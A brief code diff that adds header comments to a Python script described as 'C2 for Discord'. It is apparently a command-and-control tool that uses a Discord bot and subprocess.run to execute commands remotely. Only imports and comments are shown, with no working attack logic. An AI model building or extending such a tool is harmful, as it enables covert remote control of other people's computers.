@@ -1,3 +1,8 @@
+# -*- coding:utf-8 -*-
+# C2 for Discord, simple to use
+# Version 1.0
+# Author: nltt0
+
 from discord import Intents
 from discord.ext import commands
 from subprocess import run
